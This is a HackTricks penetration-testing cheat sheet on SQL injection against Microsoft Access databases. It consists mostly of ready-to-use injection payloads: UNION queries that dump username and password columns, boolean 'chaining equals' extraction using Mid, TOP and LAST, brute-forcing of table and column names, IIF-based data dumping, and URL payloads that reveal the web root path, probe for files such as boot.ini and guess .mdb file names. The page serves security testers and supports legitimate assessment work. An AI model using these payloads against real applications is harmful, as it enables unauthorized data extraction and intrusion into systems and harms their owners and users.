# MS Access SQL Injection

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Online Playground

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## DB Limitations

### String Concatenation

String concatenation is possible with `& (%26)` and `+ (%2b)` characters.

```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```

### Comments

There are no comments in MS access, but apparently it's possible to remove the last of a query with a NULL char:

```sql
1' union select 1,2 from table%00
```

If this is not working you could always fix the syntax of the query:

```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```

### Stacked Queries

They aren't supported.

### LIMIT

The **`LIMIT`** operator **isn't implemented**. However, it's possible to limit SELECT query results to the **first N table rows using the `TOP` operator**. `TOP` accepts as argument an integer, representing the number of rows to be returned.

```sql
1' UNION SELECT TOP 3 attr FROM table%00
```

Just like TOP you can use **`LAST`** which will get the **rows from the end**.

## UNION Queries/Sub queries

In a SQLi you usually will want to somehow execute a new query to extract information from other tables. MS Access always requires that in **subqueries or extra queries a `FROM` is indicated**.\
So, if you want to execute a `UNION SELECT` or `UNION ALL SELECT` or a `SELECT` between parenthesis in a condition, you always **need to indicate a `FROM` with a valid table name**.\
Therefore, you need to know a **valid table name**.

```sql
-1' UNION SELECT username,password from users%00
```

### Chaining equals + Substring

{% hint style="warning" %}
This will allow you to exfiltrate values of the current table without needing to know the name of the table.
{% endhint %}

**MS Access** allows **weird syntax** such as **`'1'=2='3'='asd'=false`**. As usually the SQL injection will be inside a **`WHERE`** clause we can abuse that.

Imagine you have a SQLi in a MS Access database and you know (or guessed) that one **column name is username**, and thats the field you want to **exfiltrate**. You could check the different responses of the web app when the chaining equals technique is used and potentially exfiltrate content with a **boolean injection** using the **`Mid`** function to get substrings.

```sql
'=(Mid(username,1,3)='adm')='
```

If you know the **name of the table** and **column** to dump you can use a combination between `Mid` , `LAST` and `TOP` to **leak all the info** via boolean SQLi:

```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```

_Feel free to check this in the online playground._

### Brute-forcing Tables names

Using the chaining equals technique you can also **bruteforce table names** with something like:

```sql
'=(select+top+1+'lala'+from+<table_name>)='
```

You can also use a more traditional way:

```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```

_Feel free to check this in the online playground._

* Sqlmap common table names: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* There is another list in [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### Brute-Forcing Columns names

You can **brute-force current columns names** with the chaining equals trick with:

```sql
'=column_name='
```

Or with a **group by**:

```sql
-1' GROUP BY column_name%00
```

Or you can brute-force column names of a **different table** with:

```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```

### Dumping data

We have already discussed the [**chaining equals technique**](ms-access-sql-injection.md#chaining-equals-+-substring) **to dump data from the current and other tables**. But there are other ways:

```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```

In a nutshell, the query uses an “if-then” statement in order to trigger a “200 OK” in case of success or a “500 Internal Error” otherwise. Taking advantage of the TOP 10 operator, it is possible to select the first ten results. The subsequent usage of LAST allows to consider the 10th tuple only. On such value, using the MID operator, it is possible to perform a simple character comparison. Properly changing the index of MID and TOP, we can dump the content of the “username” field for all rows.

### Time Based

Check [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### Other Interesting functions

* `Mid('admin',1,1)` get substring from position 1 length 1 (initial position is 1)
* `LEN('1234')` get length of string
* `ASC('A')` get ascii value of char
* `CHR(65)` get string from ascii value
* `IIF(1=1,'a','b')` if then
* `COUNT(*)` Count number of items

## Enumerating tables

From [**here**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) you can see a query to get tables names:

```sql
select MSysObjects.name
from MSysObjects
where
   MSysObjects.type In (1,4,6)
   and MSysObjects.name not like '~*'   
   and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```

However, note that is very typical to find SQL Injections where you **don't have access to read the table `MSysObjects`**.

## FileSystem access

### Web Root Directory Full Path

The knowledge of the **web root absolute path may facilitate further attacks**. If application errors are not completely concealed, the directory path can be uncovered trying to select data from an inexistent database.

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access responds with an **error message containing the web directory full pathname**.

### File Enumeration

The following attack vector can be used to **inferrer the existence of a file on the remote filesystem**. If the specified file exists, MS Access triggers an error message informing that the database format is invalid:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

Another way to enumerate files consists into **specifying a database.table item**. **If** the specified **file exists**, MS Access displays a **database format error message**.

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb File Name Guessing

**Database file name (.mdb)** can be inferred with the following query:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

Where **name\[i] is a .mdb filename** and **realTable is an existent table** within the database. Although MS Access will always trigger an error message, it is possible to distinguish between an invalid filename and a valid .mdb filename.

### .mdb Password Cracker

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) is a free utility that can be used to recover the main database password of Microsoft Access 95/97/2000/XP or Jet Database Engine 3.0/4.0.

## References

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
